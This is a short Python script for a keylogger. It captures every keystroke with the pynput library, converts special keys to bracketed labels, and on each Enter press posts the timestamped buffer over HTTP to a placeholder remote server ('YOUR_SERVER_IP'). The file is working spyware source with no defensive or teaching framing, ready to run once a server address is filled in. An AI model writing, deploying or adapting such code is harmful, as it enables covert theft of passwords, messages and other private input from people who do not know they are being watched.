from pynput import keyboard
import time
import requests

URL = "http://YOUR_SERVER_IP:5000/upload"

buffer = "" # Initialize an empty buffer to store keystrokes

# Define the callback function to handle key presses
def key_to_string(key):
    if hasattr(key, 'char'):
        return key.char  # Letters and numbers
    else:
        # Special keys
        key_map = {
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_l: "[LEFT SHIFT]",
            keyboard.Key.shift_r: "[RIGHT SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.ctrl_l: "[LEFT CTRL]",
            keyboard.Key.ctrl_r: "[RIGHT CTRL]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.alt_l: "[LEFT ALT]",
            keyboard.Key.alt_r: "[RIGHT ALT]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.caps_lock: "[CAPS LOCK]",
            keyboard.Key.cmd: "[COMMAND]",
            keyboard.Key.alt_gr: "[ALT GR]",
            keyboard.Key.print_screen: "[PRINT SCREEN]",
            keyboard.Key.f1: "[F1]",
            keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]",
            keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]",
            keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]",
            keyboard.Key.f12: "[F12]",
            # Add more special keys as needed
        }
        return key_map.get(key, f"[{key}]") # Not mapped keys

def send_buffer(Data):
    headers = {'Content-Type': 'text/plain'}
    try:
        response = requests.post(URL, data=Data, headers=headers, timeout=5)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False


def on_press(key):
    global buffer
    key_str = key_to_string(key)
    
    if key == keyboard.Key.enter:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        datos_a_enviar = f"<{timestamp}> {buffer}\n"
        success = send_buffer(datos_a_enviar)
        if success:
            buffer = ""  # clear buffer if sent successfully
    else:
        buffer += key_str # Append the key string to the buffer if sent failed

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()